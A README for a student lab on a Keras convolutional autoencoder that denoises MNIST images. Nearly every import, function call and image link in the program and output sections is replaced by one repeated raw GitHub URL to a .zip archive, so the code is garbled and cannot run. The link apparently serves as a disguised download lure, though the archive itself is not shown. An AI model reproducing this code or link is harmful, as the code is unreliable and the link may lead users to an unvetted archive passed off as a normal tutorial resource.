# Convolutional Autoencoder for Image Denoising

## AIM

To develop a convolutional autoencoder for image denoising application.


## DESIGN STEPS
### STEP 1:
Download and split the dataset into training and testing datasets

### STEP 2:
rescale the data as that the training is made easy

### STEP 3:
create the model for the program , in this experiment we create to networks , one for encoding and one for decoding Write your own steps
## PROGRAM
Developed by : Kiran J

Ref No : 212221240022
~~~python
from tensorflow import keras
from https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip import layers
from https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip import utils
from https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip import models
from https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip import mnist
import numpy as np
import https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip as plt

(x_train, _), (x_test, _) = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip()

https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip

(60000, 28, 28)

x_train_scaled = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip('float32') / 255.
x_test_scaled = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip('float32') / 255.
x_train_scaled = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(x_train_scaled, (len(x_train_scaled), 28, 28, 1))
x_test_scaled = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(x_test_scaled, (len(x_test_scaled), 28, 28, 1))

noise_factor = 0.5
x_train_noisy = x_train_scaled + noise_factor * https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(loc=0.0, scale=1.0, https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip) 
x_test_noisy = x_test_scaled + noise_factor * https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(loc=0.0, scale=1.0, https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip) 

x_train_noisy = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(x_train_noisy, 0., 1.)
x_train_noisy = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(x_train_noisy, 0., 1.)
x_test_noisy = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(x_test_noisy, 0., 1.)

n = 10
https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(figsize=(20, 2))
for i in range(1, n + 1):
    ax = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(1, n, i)
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(x_test_noisy[i].reshape(28, 28))
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip()
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip().set_visible(False)
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip().set_visible(False)
https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip()

input_img = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(shape=(28, 28, 1))

x = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(32, (3, 3), activation='relu', padding='same')(input_img)
x = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip((2, 2), padding='same')(x)
x = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(32, (3, 3), activation='relu', padding='same')(x)
encoded = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip((2, 2), padding='same')(x)
x = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(32, (3, 3), activation='relu', padding='same')(encoded)
x = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip((2, 2))(x)
x = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(32, (3, 3), activation='relu', padding='same')(x)
x = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip((2, 2))(x)
decoded = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(1, (3, 3), activation='sigmoid', padding='same')(x)

autoencoder = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(input_img, decoded)

https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip()

https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(optimizer='adam', loss='binary_crossentropy')

https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(x_train_noisy, x_train_scaled,
                epochs=2,
                batch_size=128,
                shuffle=True,
                validation_data=(x_test_noisy, x_test_scaled))



decoded_imgs = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(x_test_noisy)


n = 10
https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(figsize=(20, 4))
for i in range(1, n + 1):
    # Display original
    ax = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(3, n, i)
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(x_test_scaled[i].reshape(28, 28))
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip()
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip().set_visible(False)
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip().set_visible(False)

    # Display noisy
    ax = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(3, n, i+n)
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(x_test_noisy[i].reshape(28, 28))
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip()
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip().set_visible(False)
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip().set_visible(False)    

    # Display reconstruction
    ax = https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(3, n, i + 2*n)
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip(decoded_imgs[i].reshape(28, 28))
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip()
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip().set_visible(False)
    https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip().set_visible(False)
https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip()
~~~

## OUTPUT
![output](https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip)

### Original vs Noisy Vs Reconstructed Image
![output](https://raw.githubusercontent.com/kiran03-jagadeesh/convolutional-denoising-autoencoder/main/parapet/convolutional-denoising-autoencoder-v2.5.zip)

## RESULT
Thus we have successfully developed a convolutional autoencoder for image denoising application.

